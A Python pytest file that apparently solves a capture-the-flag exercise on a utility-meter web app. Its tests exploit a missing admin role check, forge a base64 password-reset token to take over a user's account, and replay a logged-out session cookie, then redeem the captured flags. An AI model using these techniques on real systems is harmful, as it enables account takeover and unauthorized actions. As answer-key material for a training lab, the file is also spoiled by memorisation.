import base64

import requests


def test_privesc_teach(devon, base_url, extract_flag_fn, redeem_flag_fn):
    # meter id 2 doesn't belong to devon -- disconnecting it as a plain
    # customer (no role=admin check on this route) is the escalation.
    resp = devon.post(f"{base_url}/admin/meters/2/disconnect", timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(devon, base_url, flag)


def test_oldtoken_exercise(anon_session, alice, base_url, extract_flag_fn, redeem_flag_fn):
    # ben's password isn't relied on as ben anywhere else in this suite --
    # deliberately chosen so this permanent password change is harmless.
    token = base64.urlsafe_b64encode(b"ben.osei@example.com:1000").decode()
    resp = anon_session.post(
        f"{base_url}/reset-password",
        data={"token": token, "password": "pwned-by-test-suite"},
        timeout=10,
    )
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)


def test_sessionreuse_bonus(login_fn, alice, base_url, redeem_flag_fn, participant_id):
    session, _ = login_fn("carla.reyes@example.com", "carla123")
    token = session.cookies.get("wgs_session")
    assert token, "expected a wgs_session cookie after login"

    logout_resp = session.post(f"{base_url}/logout", timeout=10)
    assert logout_resp.status_code in (200, 302)

    # Replay the captured (now logged-out) token manually.
    replay = requests.Session()
    replay.verify = False
    replay.cookies.set("wgs_session", token)
    replay.cookies.set("wg_pid", participant_id)
    resp = replay.get(f"{base_url}/dashboard", timeout=10)
    flag = resp.cookies.get("flag_session_reuse")
    assert flag
    assert redeem_flag_fn(alice, base_url, flag)
